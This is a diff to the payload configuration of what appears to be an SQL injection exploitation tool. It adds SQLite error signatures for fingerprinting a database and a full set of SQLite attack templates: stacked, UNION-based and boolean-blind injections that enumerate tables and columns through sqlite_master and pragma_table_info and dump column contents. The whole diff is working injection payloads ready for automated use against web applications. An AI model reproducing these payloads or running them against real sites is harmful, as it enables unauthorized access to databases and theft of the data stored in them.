@@ -7,6 +7,7 @@
 			"\"",
 			"`",
 			"' or",
+			"' (",
 			"or 1=1-- +",
 			"or 'a'='a'-- +",
 			"' or \"a\"=\"a\"-- +",
@@ -43,6 +44,8 @@
 			"pg_query()": "postgresql",
 			"syntax error at or near": "postgresql",
 			"sqlite error": "sqlite",
+			"no such function": "sqlite",
+			": syntax error": "sqlite",
 			"malformed": "mariadb",
 			"sql syntax error": null,
 			"fatal error": null,
@@ -169,6 +172,39 @@
 					"tables": "' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -",
 					"columns": "' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -",
 					"dump": "' AND IF(SUBSTRING((SELECT {column} FROM `{database}`.`{table}` LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -"
+				}
+			},
+			"sqlite": {
+				"ignored_databases": [],
+				"stacked": {
+					"database": "' AND 0; SELECT '{delimiter}' || 'sqlite_master' || '{delimiter}' as name-- -",
+					"version": "' AND 0; SELECT '{delimiter}' || sqlite_version() || '{delimiter}' as name-- -",
+					"user": "' AND 0; SELECT NULL as name-- -",
+					"databases": "' AND 0; SELECT NULL as name-- -",
+					"tables": "' AND 0; SELECT '{delimiter}' || name || '{delimiter}' as name FROM sqlite_master WHERE type='table'-- -",
+					"columns": "' AND 0; SELECT '{delimiter}' || name || '{delimiter}' as name FROM pragma_table_info('{table}')-- -",
+					"dump": "' AND 0; SELECT '{delimiter}' || {column} || '{delimiter}' as name FROM \"{table}\"-- -"
+				},
+				"union": {
+					"min_offset": 0,
+					"max_offset": 15,
+					"database": "+' UNION SELECT {offset_bef} '{delimiter}' || 'sqlite_master' || '{delimiter}' {offset_aft}-- -",
+					"version": "+' UNION SELECT {offset_bef} '{delimiter}' || sqlite_version() || '{delimiter}' {offset_aft}-- -",
+					"user": "+' UNION SELECT NULL-- -",
+					"databases": "+' UNION SELECT NULL-- -",
+					"tables": "+' UNION SELECT {offset_bef} '{delimiter}' || name || '{delimiter}' {offset_aft} FROM sqlite_master WHERE type='table' LIMIT {limit} OFFSET {offset}-- -",
+					"columns": "+' UNION SELECT {offset_bef} '{delimiter}' || name || '{delimiter}' {offset_aft} FROM pragma_table_info('{table}') LIMIT {limit} OFFSET {offset}-- -",
+					"dump": "+' UNION SELECT {offset_bef} '{delimiter}' || {column} || '{delimiter}' {offset_aft} FROM \"{table}\" LIMIT {limit} OFFSET {offset}-- -"
+				},
+				"blind-bool": {
+					"success_substring": "<div class=\"product-name\">",
+					"database": "' AND CASE WHEN SUBSTR('sqlite_master',{position},1)='{char}' THEN 1 ELSE 0 END-- -",
+					"version": "' AND CASE WHEN SUBSTR(sqlite_version(),{position},1)='{char}' THEN 1 ELSE 0 END-- -",
+					"user": "' AND 0-- -",
+					"databases": "' AND 0-- -",
+					"tables": "' AND CASE WHEN SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {offset}),{position},1)='{char}' THEN 1 ELSE 0 END-- -",
+					"columns": "' AND CASE WHEN SUBSTR((SELECT name FROM pragma_table_info('{table}') LIMIT 1 OFFSET {offset}),{position},1)='{char}' THEN 1 ELSE 0 END-- -",
+					"dump": "' AND CASE WHEN SUBSTR((SELECT {column} FROM \"{table}\" LIMIT 1 OFFSET {offset}),{position},1)='{char}' THEN 1 ELSE 0 END-- -"
 				}
 			}
 		}
